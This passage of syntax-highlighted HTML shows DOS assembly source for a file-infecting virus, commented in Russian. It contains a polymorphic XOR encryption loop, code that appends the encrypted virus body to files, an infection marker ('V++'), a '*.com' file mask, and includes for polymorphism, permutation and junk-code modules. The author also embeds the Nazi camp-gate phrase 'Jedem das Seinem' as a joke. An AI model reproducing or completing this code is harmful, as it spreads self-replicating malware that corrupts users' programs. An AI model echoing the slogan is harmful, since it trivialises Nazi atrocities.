       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">TabelleKeys</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">PPoly1</span><span class="sc0">
</span><span class="sc1">;- Кодируем</span><span class="sc0">
</span><span class="sc5">PPoly3</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">PPolyL0</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VirLength</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">PPolyL1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsw</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">TabelleKeys</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">PPolyL1</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">PPolyL_1</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">TabelleKeys</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">PPolyL0</span><span class="sc0">
</span><span class="sc5">PPolyL_1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Записываем буфер в файл</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GoToEnd</span><span class="sc0"> </span><span class="sc1">;Уходим в конец файла</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VirLength</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
</span><span class="sc1">;Считываем первые три байта файла</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GoToBegin</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Reserv</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0"> </span><span class="sc1">;Читаем первых три байта файла - это ключ для шифровки метки</span><span class="sc0">
</span><span class="sc1">;Кодируем метку</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Reserv</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'V'</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'+'</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'+'</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc1">;Записываем метку в конец файла</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GoToEnd</span><span class="sc0"> </span><span class="sc1">;Уходим в конец файла</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteEnd</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">Reserv</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0"> </span><span class="sc1">;Записываем метку вируса</span><span class="sc0">
</span><span class="sc1">;Выход</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">WriteEnd</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RND_Tabelle</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">256</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">IntConst</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">musor.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">find.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">service.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">poly.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">permut.inc</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc1">;А это я решил немного приколоться. Нет, ну правда. Должно быть весело ;)</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' Jedem das Seinem '</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc1">;!!! Данные вируса</span><span class="sc0">
</span><span class="sc5">MInt10h</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EntryPoint</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">MInt21h</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EntryPoint</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">FileMask</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EntryPoint</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.com'</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">DTA_SEG</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EntryPoint</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DTA_OFS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EntryPoint</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">JMP_OFS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EntryPoint</span><span class="sc0">
       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">Resume</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">OLD_BYTES</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EntryPoint</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">CryptLength</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">@CS</span><span class="sc0">
</span><span class="sc5">VirLength</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EntryPoint</span><span class="sc0">
</span><span class="sc1">;!!! Конец тела вируса и идентификатор зараженности файла</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Ident</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'V'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'+'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'+'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc1">;!!! Динамические данные вируса</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">Reserv</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EntryPoint</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">DTA_NEW</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EntryPoint</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;---</span><span class="sc0">
</span><span class="sc5">Buffer</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">EntryPoint</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
